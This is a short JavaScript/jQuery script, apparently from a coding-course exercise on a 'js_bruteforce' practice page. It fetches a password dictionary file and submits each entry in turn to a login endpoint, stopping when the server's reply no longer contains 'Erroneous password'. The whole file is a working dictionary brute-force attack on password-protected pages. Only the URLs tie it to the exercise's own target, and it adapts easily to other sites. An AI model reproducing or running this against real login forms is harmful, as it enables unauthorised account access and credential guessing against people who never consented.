var psw = {}
$.ajax({
	async: false
	, url: "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt"
	, success: function (result) {
		psw = result.split("\n");
	}
}).done(function() {

var position = psw.length;
for (var i = 0; i < position ; i++) {
	$.ajax({
		type: "GET"
		, async: false
		, url: "http://docusland.fr/code-academie/js_bruteforce/index.php"
		, data: {password: psw[i]}
		, success: function (answer) {
			$("p").html("password tested: " + psw[i]);
			$("div").html(answer);
			if (!answer.match("Erroneous password")) {
				position = i;
			}
		}
	});
}})
